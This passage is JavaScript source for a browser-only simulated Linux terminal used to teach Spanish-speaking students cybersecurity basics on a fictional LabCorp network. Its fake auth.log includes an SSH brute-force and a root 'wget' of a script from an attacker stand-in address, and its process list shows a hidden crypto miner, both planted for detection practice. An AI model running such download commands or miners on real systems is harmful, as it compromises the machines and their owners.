/* Cyber Lab · Terminal simulada
   Un equipo Linux ficticio ("lab", 10.10.10.100) dentro de la red 10.10.10.0/24 de LabCorp.
   Nada de lo que se ejecuta aquí sale del navegador. */
(function (global) {
'use strict';

/* ------------------------------------------------------------------ */
/* Red del laboratorio                                                 */
/* ------------------------------------------------------------------ */
const ME = { ip: '10.10.10.100', cidr: 24, mac: '02:42:0a:0a:0a:64', gw: '10.10.10.1', pub: '203.0.113.77', host: 'lab' };
const P = (state, svc, ver) => [state, svc, ver || ''];
const HOSTS = {
  '10.10.10.1':   { name: 'gateway.labcorp.local', ttl: 64,  os: 'Linux 5.x (router)', def: 'closed', ports: { 53: P('open','domain','dnsmasq 2.89'), 80: P('open','http','lighttpd 1.4.69') } },
  '10.10.10.10':  { name: 'www.labcorp.local',     ttl: 64,  os: 'Linux 5.x',          def: 'filtered', ports: { 22: P('filtered','ssh'), 80: P('open','http','nginx 1.24.0'), 443: P('open','https','nginx 1.24.0') } },
  '10.10.10.20':  { name: 'db.labcorp.local',      ttl: 64,  os: 'Linux 5.x',          def: 'closed', ports: { 22: P('open','ssh','OpenSSH 8.9p1 Ubuntu'), 3306: P('open','mysql','MySQL 5.7.29') } },
  '10.10.10.25':  { name: 'mail.labcorp.local',    ttl: 64,  os: 'Linux 5.x',          def: 'closed', ports: { 25: P('open','smtp','Postfix smtpd'), 143: P('open','imap','Dovecot imapd'), 587: P('open','submission','Postfix smtpd') } },
  '10.10.10.30':  { name: 'files.labcorp.local',   ttl: 128, os: 'Microsoft Windows Server 2019', def: 'closed', ports: { 135: P('open','msrpc','Microsoft Windows RPC'), 139: P('open','netbios-ssn','Microsoft Windows netbios-ssn'), 445: P('open','microsoft-ds','Windows Server 2019 microsoft-ds'), 3389: P('open','ms-wbt-server','Microsoft Terminal Services') } },
  '10.10.10.50':  { name: 'printer.labcorp.local', ttl: 255, os: 'HP JetDirect (impresora)', def: 'closed', ports: { 80: P('open','http','HP embedded httpd'), 9100: P('open','jetdirect') } },
  '10.10.10.100': { name: 'lab.labcorp.local',     ttl: 64,  os: 'Linux 6.x',          def: 'closed', ports: { 22: P('open','ssh','OpenSSH 9.6p1 Ubuntu'), 3306: P('open','mysql','MySQL 8.0.39') } },
};
const EXTERNAL = {
  '185.199.108.153': { name: 'cdn-185-199-108-153.github.com', ports: { 80: P('open','http','GitHub Pages'), 443: P('open','https','GitHub Pages') } },
  '185.199.109.153': { name: 'cdn-185-199-109-153.github.com', ports: { 80: P('open','http','GitHub Pages'), 443: P('open','https','GitHub Pages') } },
  '185.199.110.153': { name: 'cdn-185-199-110-153.github.com', ports: { 80: P('open','http','GitHub Pages'), 443: P('open','https','GitHub Pages') } },
  '185.199.111.153': { name: 'cdn-185-199-111-153.github.com', ports: { 80: P('open','http','GitHub Pages'), 443: P('open','https','GitHub Pages') } },
  '198.51.100.10':   { name: 'ejemplo.com', ports: { 80: P('open','http','Apache httpd 2.4.58'), 443: P('open','https','Apache httpd 2.4.58') } },
};
const GH = ['185.199.108.153','185.199.109.153','185.199.110.153','185.199.111.153'];
const DNS = {
  'labcorp.local':          { A: ['10.10.10.10'], MX: ['10 mail.labcorp.local'], NS: ['gateway.labcorp.local'], TXT: ['"v=spf1 mx -all"'] },
  'gateway.labcorp.local':  { A: ['10.10.10.1'] },
  'www.labcorp.local':      { A: ['10.10.10.10'] },
  'intranet.labcorp.local': { CNAME: ['www.labcorp.local'] },
  'db.labcorp.local':       { A: ['10.10.10.20'] },
  'mail.labcorp.local':     { A: ['10.10.10.25'] },
  'files.labcorp.local':    { A: ['10.10.10.30'] },
  'printer.labcorp.local':  { A: ['10.10.10.50'] },
  'lab.labcorp.local':      { A: ['10.10.10.100'] },
  'huergalabs.dev':         { A: GH.slice(), NS: ['ns1.cloudflare.com', 'ns2.cloudflare.com'] },
  'cyber.huergalabs.dev':   { CNAME: ['rhuerga-dev.github.io'] },
  'rhuerga-dev.github.io':  { A: GH.slice() },
  'ejemplo.com':            { A: ['198.51.100.10'], MX: ['10 correo.ejemplo.com'] },
  'ifconfig.me':            { A: ['34.160.111.145'] },
};
const ipInt = s => s.split('.').reduce((a, b) => a * 256 + (+b), 0) >>> 0;
const intIp = n => [n >>> 24, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
const isIP = s => /^(\d{1,3}\.){3}\d{1,3}$/.test(s) && s.split('.').every(x => +x <= 255);
const maskOf = c => c === 0 ? 0 : (0xFFFFFFFF << (32 - c)) >>> 0;
const pad = (s, n) => String(s).padEnd(n);
const lpad = (s, n) => String(s).padStart(n);
const SVC = { 21:'ftp',22:'ssh',23:'telnet',25:'smtp',53:'domain',80:'http',110:'pop3',135:'msrpc',139:'netbios-ssn',143:'imap',443:'https',445:'microsoft-ds',587:'submission',993:'imaps',995:'pop3s',3306:'mysql',3389:'ms-wbt-server',5432:'postgresql',8000:'http-alt',8080:'http-proxy',9100:'jetdirect' };
const TOP = [21,22,23,25,53,80,110,135,139,143,443,445,587,993,995,3306,3389,5432,8080,9100];

/* ------------------------------------------------------------------ */
/* Sistema de archivos                                                 */
/* ------------------------------------------------------------------ */
function D(owner, perm, children, group) { return { t: 'd', owner: owner || 'root', group: group || owner || 'root', perm: perm || '755', c: children || {}, date: 'Nov  6 08:00' }; }
function F(owner, perm, content, group, date) { return { t: 'f', owner: owner || 'root', group: group || owner || 'root', perm: perm || '644', content: content || '', date: date || 'Nov  6 08:00' }; }

function authLog() {
  const z = n => String(n).padStart(2, '0');
  const ts = (h, m, s) => `Nov  6 ${z(h)}:${z(m)}:${z(s)}`;
  const L = [];
  L.push(`${ts(2, 58, 10)} db sshd[1101]: Accepted password for alumno from 10.10.10.100 port 50412 ssh2`);
  L.push(`${ts(2, 58, 10)} db sshd[1101]: pam_unix(sshd:session): session opened for user alumno by (uid=0)`);
  L.push(`${ts(3, 0, 1)} db CRON[1150]: pam_unix(cron:session): session opened for user root by (uid=0)`);
  const users = ['root', 'admin', 'test', 'oracle', 'ubuntu'];
  let other = 0;
  for (let i = 0; i < 38; i++) {
    const m = 12 + Math.floor(i / 6), s = (i * 7) % 60;
    L.push(`${ts(3, m, s)} db sshd[${1200 + i}]: Failed password for ${users[i % 5]} from 198.51.100.66 port ${40000 + i * 13} ssh2`);
    if (i % 10 === 4 && other < 4) {
      L.push(`${ts(3, m, (s + 3) % 60)} db sshd[${1260 + other}]: Failed password for invalid user pi from 203.0.113.9 port ${52000 + other} ssh2`);
      other++;
    }
  }
  while (other < 4) { L.push(`${ts(3, 18, 50 + other)} db sshd[${1260 + other}]: Failed password for invalid user pi from 203.0.113.9 port ${52000 + other} ssh2`); other++; }
  L.push(`${ts(3, 19, 44)} db sshd[1290]: Accepted password for root from 198.51.100.66 port 40555 ssh2`);
  L.push(`${ts(3, 19, 44)} db sshd[1290]: pam_unix(sshd:session): session opened for user root by (uid=0)`);
  L.push(`${ts(3, 21, 2)} db sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.66/x.sh`);
  return L.join('\n') + '\n';
}

const CONTAR = () => `import re
from collections import Counter

${t('# Lee el log de SSH y cuenta los intentos fallidos por IP')}
patron = re.compile(r"Failed password for (?:invalid user )?\\S+ from (\\S+)")
contador = Counter()

with open("/var/log/auth.log") as log:
    for linea in log:
        coincidencia = patron.search(linea)
        if coincidencia:
            contador[coincidencia.group(1)] += 1

for ip, total in contador.most_common():
    print(f"{ip:<16} ${t('{n} intentos', { n: '{total}' })}")
`;

function makeFS() {
  return D('root', '755', {
    home: D('root', '755', {
      alumno: D('alumno', '750', {
        'mision.txt': F('alumno', '644', t(`=== LABCORP · LABORATORIO DE CIBERSEGURIDAD ===
Bienvenido/a, alumno.
Este equipo (lab) está conectado a la red 10.10.10.0/24 de LabCorp.
Todo lo que hagas aquí es una simulación segura.

Tu primera bandera es:
FLAG{primer_paso}
`), 'alumno', 'Nov  6 09:02'),
        '.pista_oculta': F('alumno', '644', t(`Bien visto. Los archivos que empiezan por punto no salen con un ls normal.
FLAG{archivos_ocultos}
`), 'alumno', 'Nov  6 09:03'),
        '.bash_history': F('alumno', '600', 'ls\ncat notas.txt\nmysql -u root\nexit\n', 'alumno', 'Nov  6 09:05'),
        'notas.txt': F('alumno', '644', t(`Pendientes:
- Revisar por qué MySQL escucha en todas las interfaces (0.0.0.0).
- Cambiar los permisos de secreto.txt, cualquiera puede leerlo.
- Preguntar a Lía por los intentos de acceso SSH en el servidor db.
`), 'alumno', 'Nov  6 09:10'),
        'secreto.txt': F('alumno', '666', t(`Contraseña del router: Lab0rC0rp!2026
(Esto nunca debería estar en un archivo que cualquiera pueda leer.)
`), 'alumno', 'Nov  6 09:14'),
        'captura.pcap': F('alumno', '644', '\u0000PCAP', 'alumno', 'Nov  6 09:20'),
        scripts: D('alumno', '755', {
          'contar_ips.py': F('alumno', '644', CONTAR(), 'alumno', 'Nov  6 09:30'),
          'hola.py': F('alumno', '644', `print("${t('Hola desde Python')}")\n`, 'alumno', 'Nov  6 09:31'),
        }, 'alumno'),
      }, 'alumno'),
    }),
    etc: D('root', '755', {
      hosts: F('root', '644', '127.0.0.1\tlocalhost\n10.10.10.100\tlab\n10.10.10.1\tgateway.labcorp.local gateway\n'),
      'resolv.conf': F('root', '644', 'nameserver 10.10.10.1\nsearch labcorp.local\n'),
      hostname: F('root', '644', 'lab\n'),
      passwd: F('root', '644', `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:110:118:MySQL Server:/nonexistent:/bin/false
alumno:x:1000:1000:Alumno,,,:/home/alumno:/bin/bash
`),
      shadow: F('root', '640', `root:$y$j9T$Hc0.Q1f8$k2v9...:20398:0:99999:7:::
alumno:$y$j9T$7aZ.pQ0w$Uq3m...:20398:0:99999:7:::
`, 'shadow'),
    }),
    var: D('root', '755', {
      log: D('root', '755', {
        'auth.log': F('syslog', '640', authLog(), 'adm', 'Nov  6 03:21'),
        syslog: F('syslog', '640', 'Nov  6 08:00:01 lab systemd[1]: Started Daily apt download activities.\nNov  6 08:00:05 lab kernel: [ 4242.1] eth0: link up, 1000Mbps, full-duplex\n', 'adm'),
      }),
    }),
    tmp: D('root', '777', {
      '.cache': D('alumno', '755', { xmrig: F('alumno', '755', '\u0000ELF', 'alumno', 'Nov  6 03:25') }, 'alumno'),
    }),
    root: D('root', '700', { 'flag.txt': F('root', '600', 'FLAG{solo_root}\n') }),
  });
}

function makeProcs() {
  return [
    { user: 'root', pid: 1, cpu: 0.0, mem: 0.1, cmd: '/sbin/init splash' },
    { user: 'root', pid: 412, cpu: 0.0, mem: 0.2, cmd: 'sshd: /usr/sbin/sshd -D' },
    { user: 'mysql', pid: 733, cpu: 0.4, mem: 4.1, cmd: '/usr/sbin/mysqld' },
    { user: 'root', pid: 801, cpu: 0.0, mem: 0.1, cmd: '/usr/sbin/cron -f' },
    { user: 'alumno', pid: 1520, cpu: 0.0, mem: 0.3, cmd: '-bash' },
    { user: 'alumno', pid: 1688, cpu: 0.2, mem: 1.8, cmd: 'php artisan serve --host=127.0.0.1 --port=8000' },
    { user: 'alumno', pid: 4242, cpu: 98.7, mem: 2.3, cmd: '/tmp/.cache/xmrig -o pool.minexmr.example:4444' },
  ];
}

/* ------------------------------------------------------------------ */
/* Utilidades de línea de comandos                                     */
/* ------------------------------------------------------------------ */
function tokenize(s) {
  const out = []; let cur = '', q = null, has = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (q) { if (ch === q) q = null; else cur += ch; continue; }
    if (ch === '"' || ch === "'") { q = ch; has = true; continue; }
    if (/\s/.test(ch)) { if (cur || has) { out.push(cur); cur = ''; has = false; } continue; }
    if (ch === '|' || ch === '>') {
      if (cur || has) { out.push(cur); cur = ''; has = false; }
      if (ch === '>' && s[i + 1] === '>') { out.push({ op: '>>' }); i++; } else out.push({ op: ch });
      continue;
    }
    cur += ch;
  }
  if (q) return { error: I18N.t('Falta cerrar una comilla ({q}).', { q }) };
  if (cur || has) out.push(cur);
  return out;
}
function permStr(n) {
  const t = n.t === 'd' ? 'd' : '-';
  return t + n.perm.split('').map(d => { d = +d; return (d & 4 ? 'r' : '-') + (d & 2 ? 'w' : '-') + (d & 1 ? 'x' : '-'); }).join('');
}
const GROUPS = { alumno: ['alumno', 'adm', 'sudo'], root: ['root'] };

/* ------------------------------------------------------------------ */
/* Simulador                                                           */
/* ------------------------------------------------------------------ */
class Sim {
  constructor() { this.reset(); }
  reset() {
    this.fs = makeFS(); this.cwd = '/home/alumno'; this.user = 'alumno';
    this.history = []; this.procs = makeProcs(); this.sudoWarned = false;
  }
  get home() { return '/home/alumno'; }
  prompt() { const p = this.cwd === this.home ? '~' : this.cwd.startsWith(this.home + '/') ? '~' + this.cwd.slice(this.home.length) : this.cwd; return { user: 'alumno', host: ME.host, path: p }; }

  abs(p) {
    if (!p || p === '~') return this.home;
    if (p.startsWith('~/')) p = this.home + p.slice(1);
    const parts = (p.startsWith('/') ? p : this.cwd + '/' + p).split('/');
    const st = [];
    for (const x of parts) { if (!x || x === '.') continue; if (x === '..') st.pop(); else st.push(x); }
    return '/' + st.join('/');
  }
  node(path) {
    let n = this.fs; if (path === '/') return n;
    for (const x of path.split('/').filter(Boolean)) { if (n.t !== 'd' || !n.c[x]) return null; n = n.c[x]; }
    return n;
  }
  parent(path) { const i = path.lastIndexOf('/'); return { dir: this.node(path.slice(0, i) || '/'), name: path.slice(i + 1) }; }
  can(n, bit, user) {
    user = user || this.user; if (user === 'root') return true;
    const p = n.perm.split('').map(Number);
    if (n.owner === user) return !!(p[0] & bit);
    if ((GROUPS[user] || []).includes(n.group)) return !!(p[1] & bit);
    return !!(p[2] & bit);
  }
  // Comprueba que se puede atravesar cada carpeta de la ruta
  reach(path, user) {
    let n = this.fs; const parts = path.split('/').filter(Boolean);
    for (let i = 0; i < parts.length; i++) {
      if (!this.can(n, 1, user)) return { err: 'Permission denied' };
      n = n.c[parts[i]]; if (!n) return { err: 'No such file or directory' };
      if (i < parts.length - 1 && n.t !== 'd') return { err: 'Not a directory' };
    }
    return { n };
  }
  readFile(arg, user, cmd) {
    const path = this.abs(arg), r = this.reach(path, user);
    if (r.err) return { err: `${cmd}: ${arg}: ${r.err}` };
    if (r.n.t === 'd') return { err: `${cmd}: ${arg}: Is a directory` };
    if (!this.can(r.n, 4, user)) return { err: `${cmd}: ${arg}: Permission denied` };
    if (r.n.content.startsWith('\u0000')) return { bin: true, text: '', n: r.n };
    return { text: r.n.content, n: r.n };
  }
  writeFile(arg, text, append, user) {
    const path = this.abs(arg), { dir, name } = this.parent(path);
    if (!dir || dir.t !== 'd') return `bash: ${arg}: No such file or directory`;
    const ex = dir.c[name];
    if (ex && ex.t === 'd') return `bash: ${arg}: Is a directory`;
    if (ex ? !this.can(ex, 2, user) : !this.can(dir, 2, user)) return `bash: ${arg}: Permission denied`;
    if (ex) ex.content = append ? ex.content + text : text;
    else dir.c[name] = F(user, '644', text, user, 'Nov  6 ' + new Date().toTimeString().slice(0, 5));
    return null;
  }

  resolve(name) {
    name = name.replace(/\.$/, '').toLowerCase();
    if (isIP(name)) return { ips: [name], canon: name };
    if (name === 'localhost') return { ips: ['127.0.0.1'], canon: 'localhost' };
    if (name === 'lab') return { ips: [ME.ip], canon: 'lab' };
    let q = name;
    if (!DNS[q] && !q.includes('.') && DNS[q + '.labcorp.local']) q = q + '.labcorp.local';
    const chain = [];
    for (let i = 0; i < 5 && DNS[q] && DNS[q].CNAME; i++) { chain.push([q, DNS[q].CNAME[0]]); q = DNS[q].CNAME[0]; }
    if (!DNS[q] || !DNS[q].A) return null;
    return { ips: DNS[q].A.slice(), canon: q, chain, query: name };
  }
  hostInfo(ip) {
    if (HOSTS[ip]) return Object.assign({ internal: true, up: true }, HOSTS[ip]);
    if (EXTERNAL[ip]) return Object.assign({ internal: false, up: true, ttl: 56, def: 'filtered', os: 'Linux (CDN)' }, EXTERNAL[ip]);
    if (ip === '127.0.0.1') return Object.assign({ internal: true, up: true }, HOSTS[ME.ip], { name: 'localhost' });
    const n = ipInt(ip), net = ipInt('10.10.10.0');
    if ((n & maskOf(24)) === net) return { internal: true, up: false };
    if (ip === '34.160.111.145') return { internal: false, up: true, ttl: 56, name: 'ifconfig.me', def: 'filtered', ports: { 80: P('open', 'http'), 443: P('open', 'https') } };
    return { internal: false, up: false };
  }

  complete(line) {
    const toks = line.split(/\s+/); const last = toks[toks.length - 1] || '';
    if (toks.length === 1) return Object.keys(CMDS).filter(c => c.startsWith(last)).sort();
    const slash = last.lastIndexOf('/');
    const dirPart = slash >= 0 ? last.slice(0, slash + 1) : '', base = slash >= 0 ? last.slice(slash + 1) : last;
    const d = this.node(this.abs(dirPart || '.'));
    if (!d || d.t !== 'd') return [];
    return Object.keys(d.c).filter(n => n.startsWith(base) && (base.startsWith('.') || !n.startsWith('.'))).sort().map(n => dirPart + n + (d.c[n].t === 'd' ? '/' : ''));
  }

  /* Ejecuta una línea completa. Devuelve { out, clear, entry } */
  run(line) {
    const raw = line.trim();
    const entry = { line: raw, cmds: [], cwd: this.cwd, ok: true };
    if (!raw) return { out: '', entry };
    this.history.push(raw);
    const toks = tokenize(raw);
    if (toks.error) { entry.ok = false; return { out: 'bash: ' + toks.error, err: true, entry }; }
    // separar redirección
    let redir = null; const t2 = [];
    for (let i = 0; i < toks.length; i++) {
      if (toks[i] && toks[i].op && (toks[i].op === '>' || toks[i].op === '>>')) { redir = { append: toks[i].op === '>>', file: toks[i + 1] }; i++; continue; }
      t2.push(toks[i]);
    }
    if (redir && (typeof redir.file !== 'string' || !redir.file)) { entry.ok = false; return { out: 'bash: ' + I18N.t('error de sintaxis: falta el archivo después de >'), err: true, entry }; }
    const segs = [[]];
    for (const t of t2) { if (t && t.op === '|') segs.push([]); else segs[segs.length - 1].push(t); }
    if (segs.some(s => !s.length)) { entry.ok = false; return { out: 'bash: ' + I18N.t('error de sintaxis cerca de "|"'), err: true, entry }; }
    let stdin = null, out = '', err = false, clear = false;
    for (const seg of segs) {
      let argv = seg.slice(), sudo = false;
      if (argv[0] === 'sudo') { sudo = true; argv.shift(); if (!argv.length) { out = I18N.t('uso: sudo comando'); err = true; break; } }
      const name = argv[0], args = argv.slice(1);
      entry.cmds.push({ name, args, sudo });
      const fn = CMDS[name];
      if (!fn) { out = I18N.t('{name}: command not found\nEscribe help para ver los comandos disponibles.', { name }); err = true; entry.ok = false; break; }
      const ctx = { sim: this, user: sudo ? 'root' : this.user, sudo, stdin };
      let pre = '';
      if (sudo && !this.sudoWarned) { this.sudoWarned = true; pre = I18N.t('[sudo] password for alumno: (en el laboratorio no hace falta escribirla)') + '\n'; }
      let r;
      try { r = fn(args, ctx); } catch (e) { r = { out: I18N.t('{name}: error interno del laboratorio', { name }), err: true }; }
      if (typeof r === 'string') r = { out: r };
      if (r.clear) clear = true;
      out = pre + (r.out || '');
      if (r.err) { err = true; entry.ok = false; break; }
      stdin = r.out || '';
    }
    entry.cwd = this.cwd;
    if (redir && !err) {
      const e = this.writeFile(redir.file, out.endsWith('\n') || !out ? out : out + '\n', redir.append, entry.cmds.some(c => c.sudo) ? 'root' : this.user);
      if (e) { entry.ok = false; return { out: e, err: true, entry }; }
      out = '';
    }
    entry.out = out;
    return { out: out.replace(/\n$/, ''), err, clear, entry };
  }
}

/* ------------------------------------------------------------------ */
/* Comandos                                                            */
/* ------------------------------------------------------------------ */
const flagsOf = args => { const f = new Set(), rest = []; for (const a of args) { if (/^-[a-zA-Z]+$/.test(a)) a.slice(1).split('').forEach(c => f.add(c)); else rest.push(a); } return { f, rest }; };
const lines = s => s === '' ? [] : s.replace(/\n$/, '').split('\n');
function inputText(args, ctx, cmd) {
  if (!args.length) { if (ctx.stdin === null) return { err: t('{cmd}: falta el archivo. Ejemplo: {cmd} archivo.txt', { cmd }) }; return { text: ctx.stdin }; }
  let text = '';
  for (const a of args) { const r = ctx.sim.readFile(a, ctx.user, cmd); if (r.err) return { err: r.err }; if (r.bin) return { err: t('{cmd}: {file}: es un archivo binario', { cmd, file: a }) }; text += r.text; }
  return { text };
}
function numOpt(args, def) {
  let n = def; const rest = [];
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '-n') { n = parseInt(args[++i], 10); continue; }
    if (/^-n\d+$/.test(args[i])) { n = parseInt(args[i].slice(2), 10); continue; }
    if (/^-\d+$/.test(args[i])) { n = parseInt(args[i].slice(1), 10); continue; }
    rest.push(args[i]);
  }
  return { n: isNaN(n) ? def : n, rest };
}

const EXPLICA = {
  help: 'Muestra los comandos disponibles en el laboratorio.',
  pwd: 'Print Working Directory: muestra la carpeta en la que estás.',
  ls: 'Lista archivos. -l muestra permisos y dueño, -a incluye los ocultos (los que empiezan por punto).',
  cd: 'Cambia de carpeta. "cd .." sube un nivel, "cd" o "cd ~" vuelve a tu carpeta personal.',
  cat: 'Muestra el contenido de un archivo.',
  head: 'Muestra las primeras líneas de un archivo (10 por defecto, o -n N).',
  tail: 'Muestra las últimas líneas de un archivo (10 por defecto, o -n N). Muy usado con logs.',
  grep: 'Busca líneas que contienen un texto. -i ignora mayúsculas, -c cuenta, -v invierte, -n numera.',
  wc: 'Cuenta líneas (-l), palabras (-w) o caracteres (-c).',
  sort: 'Ordena líneas. -n numérico, -r al revés.',
  uniq: 'Junta líneas repetidas seguidas. -c dice cuántas veces aparece cada una (ordena antes con sort).',
  awk: 'Procesa texto por columnas. Ejemplo: awk \'{print $11}\' saca la columna 11.',
  cut: 'Corta columnas. Ejemplo: cut -d: -f1 /etc/passwd',
  echo: 'Escribe un texto. Con > lo guardas en un archivo.',
  whoami: 'Dice con qué usuario estás conectado.',
  id: 'Muestra tu usuario, tu UID y los grupos a los que perteneces.',
  sudo: 'Ejecuta un comando como root (administrador). Úsalo solo cuando haga falta.',
  chmod: 'Cambia permisos. Ejemplo: chmod 600 archivo (solo el dueño puede leer y escribir).',
  ip: '"ip a" muestra tus interfaces de red e IPs. "ip route" muestra tu puerta de enlace.',
  ifconfig: 'Forma antigua de ver tus interfaces de red (como en tu Mac).',
  ping: 'Comprueba si un equipo responde. Fíjate en el TTL: 64 suele ser Linux, 128 Windows.',
  traceroute: 'Muestra los routers por los que pasan tus paquetes hasta el destino.',
  nslookup: 'Pregunta al DNS la IP de un nombre. -type=mx para servidores de correo.',
  dig: 'Herramienta DNS más completa. Ejemplos: dig labcorp.local MX, dig +short www.labcorp.local, dig -x 10.10.10.20',
  host: 'Consulta DNS en formato corto.',
  curl: 'Hace peticiones web. curl ifconfig.me te dice tu IP pública, curl -I muestra solo las cabeceras.',
  ss: 'Muestra los puertos que escucha TU equipo. ss -tuln es la combinación más usada.',
  netstat: 'Versión antigua de ss.',
  ps: 'Lista procesos. ps aux muestra todos, con su uso de CPU y memoria.',
  kill: 'Termina un proceso por su PID. Ejemplo: kill 1234',
  nmap: 'Escáner de puertos. -sn descubre equipos, -sS escaneo SYN (requiere sudo), -sV versiones, -p puertos. Solo contra equipos con permiso.',
  tcpdump: 'Captura o lee tráfico de red. En el laboratorio: tcpdump -r captura.pcap',
  ipcalc: 'Calcula red, broadcast y rango de una subred. Ejemplo: ipcalc 10.10.10.77/26',
  python3: 'Ejecuta un script de Python. Ejemplo: python3 scripts/contar_ips.py',
  history: 'Muestra los comandos que has escrito.',
  clear: 'Limpia la pantalla de la terminal.',
  touch: 'Crea un archivo vacío.', mkdir: 'Crea una carpeta.', rm: 'Borra un archivo.',
  hostname: 'Muestra el nombre del equipo.', uname: 'Información del sistema. uname -a muestra todo.', date: 'Muestra la fecha y hora.',
  explica: 'Explica para qué sirve un comando. Ejemplo: explica nmap',
};
EXPLICA.explain = EXPLICA.explica;

const CMDS = {
  help() {
    return t(`Comandos del laboratorio (escribe "explica <comando>" para saber más):

  Archivos   pwd  ls  cd  cat  head  tail  touch  mkdir  rm  echo
  Texto      grep  wc  sort  uniq  awk  cut
  Sistema    whoami  id  sudo  chmod  ps  kill  hostname  uname  date  history  clear
  Red        ip  ifconfig  ping  traceroute  nslookup  dig  host  curl  ss  netstat
  Seguridad  nmap  tcpdump  ipcalc
  Código     python3

Puedes encadenar comandos con | y guardar la salida con >.
Flechas arriba/abajo: historial. Tab: autocompletar.`);
  },
  explica(args) { const c = args[0]; if (!c) return t('uso: explica <comando>'); return EXPLICA[c] ? `${c}: ${t(EXPLICA[c])}` : t('No tengo explicación para "{c}". Escribe help para ver la lista.', { c }); },
  explain(args) { return CMDS.explica(args); },
  man(args) { return CMDS.explica(args); },
  clear() { return { clear: true, out: '' }; },
  pwd(a, ctx) { return ctx.sim.cwd; },
  whoami(a, ctx) { return ctx.user; },
  id(a, ctx) { return ctx.user === 'root' ? 'uid=0(root) gid=0(root) groups=0(root)' : 'uid=1000(alumno) gid=1000(alumno) groups=1000(alumno),4(adm),27(sudo)'; },
  hostname() { return 'lab'; },
  uname(args) { return args.includes('-a') ? 'Linux lab 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux' : 'Linux'; },
  date() { return new Date().toString().replace(/ GMT.*$/, ''); },
  history(a, ctx) { return ctx.sim.history.map((h, i) => lpad(i + 1, 5) + '  ' + h).join('\n'); },
  exit() { return t('Esta terminal no se puede cerrar: es tu laboratorio. Si quieres empezar de cero, usa el botón "Reiniciar laboratorio".'); },
  echo(args) { return args.join(' '); },
  cd(args, ctx) {
    const s = ctx.sim, target = args[0] === undefined ? '~' : args[0];
    const path = s.abs(target), r = s.reach(path, ctx.user);
    if (r.err) return { out: `bash: cd: ${target}: ${r.err}`, err: true };
    if (r.n.t !== 'd') return { out: `bash: cd: ${target}: Not a directory`, err: true };
    if (!s.can(r.n, 1, ctx.user)) return { out: `bash: cd: ${target}: Permission denied`, err: true };
    s.cwd = path; return '';
  },
  ls(args, ctx) {
    const { f, rest } = flagsOf(args); const s = ctx.sim; const targets = rest.length ? rest : ['.'];
    const blocks = [];
    for (const t of targets) {
      const path = s.abs(t), r = s.reach(path, ctx.user);
      if (r.err) return { out: `ls: cannot access '${t}': ${r.err}`, err: true };
      let entries;
      if (r.n.t === 'd') {
        if (!s.can(r.n, 4, ctx.user)) return { out: `ls: cannot open directory '${t}': Permission denied`, err: true };
        entries = Object.keys(r.n.c).filter(n => f.has('a') || !n.startsWith('.')).sort((a, b) => a.replace(/^\./, '').localeCompare(b.replace(/^\./, ''))).map(n => [n, r.n.c[n]]);
        if (f.has('a')) entries.unshift(['.', r.n], ['..', s.node(s.abs(t + '/..')) || r.n]);
      } else entries = [[t, r.n]];
      let o;
      if (f.has('l')) {
        const sz = n => n.t === 'd' ? 4096 : n.content.length;
        o = (r.n.t === 'd' ? `total ${entries.length * 4}\n` : '') + entries.map(([n, x]) => `${permStr(x)} 1 ${pad(x.owner, 6)} ${pad(x.group, 6)} ${lpad(sz(x), 5)} ${x.date} ${n}${x.t === 'd' ? '/' : ''}`).join('\n');
      } else o = entries.map(([n, x]) => n + (x.t === 'd' ? '/' : '')).join('  ');
      blocks.push(targets.length > 1 ? `${t}:\n${o}` : o);
    }
    return blocks.join('\n\n');
  },
  cat(args, ctx) {
    if (!args.length) return ctx.stdin === null ? { out: t('cat: falta el archivo. Ejemplo: cat mision.txt'), err: true } : ctx.stdin;
    let o = '';
    for (const a of args) {
      const r = ctx.sim.readFile(a, ctx.user, 'cat');
      if (r.err) return { out: (o ? o + '\n' : '') + r.err, err: true };
      if (r.bin) { o += (a.endsWith('.pcap') ? t('({file} es una captura de red binaria. Léela con: tcpdump -r {file})', { file: a }) : t('({file} es un archivo binario y no se puede mostrar como texto)', { file: a })) + '\n'; continue; }
      o += r.text;
    }
    return o;
  },
  head(args, ctx) { const { n, rest } = numOpt(args, 10); const r = inputText(rest, ctx, 'head'); if (r.err) return { out: r.err, err: true }; return lines(r.text).slice(0, n).join('\n'); },
  tail(args, ctx) { const { n, rest } = numOpt(args, 10); const r = inputText(rest, ctx, 'tail'); if (r.err) return { out: r.err, err: true }; const l = lines(r.text); return l.slice(Math.max(0, l.length - n)).join('\n'); },
  wc(args, ctx) {
    const { f, rest } = flagsOf(args); const r = inputText(rest, ctx, 'wc'); if (r.err) return { out: r.err, err: true };
    const l = lines(r.text).length, w = r.text.split(/\s+/).filter(Boolean).length, c = r.text.length;
    const name = rest.length ? ' ' + rest.join(' ') : '';
    if (f.has('l')) return l + name; if (f.has('w')) return w + name; if (f.has('c')) return c + name;
    return `${lpad(l, 3)} ${lpad(w, 4)} ${lpad(c, 5)}${name}`;
  },
  grep(args, ctx) {
    const { f, rest } = flagsOf(args);
    if (!rest.length) return { out: t('uso: grep [-i -c -v -n] "texto" archivo'), err: true };
    const pat = rest[0], files = rest.slice(1);
    let re; try { re = new RegExp(pat, f.has('i') ? 'i' : ''); } catch (e) { re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), f.has('i') ? 'i' : ''); }
    const res = []; let count = 0;
    const srcs = files.length ? files : [null];
    for (const file of srcs) {
      let text;
      if (file === null) { if (ctx.stdin === null) return { out: t('grep: falta el archivo. Ejemplo: grep "Failed" /var/log/auth.log'), err: true }; text = ctx.stdin; }
      else { const r = ctx.sim.readFile(file, ctx.user, 'grep'); if (r.err) return { out: r.err, err: true }; text = r.text; }
      let c = 0;
      lines(text).forEach((ln, i) => { if (re.test(ln) !== f.has('v')) { c++; if (!f.has('c')) res.push((files.length > 1 ? file + ':' : '') + (f.has('n') ? (i + 1) + ':' : '') + ln); } });
      if (f.has('c')) res.push((files.length > 1 ? file + ':' : '') + c);
      count += c;
    }
    return res.join('\n');
  },
  sort(args, ctx) {
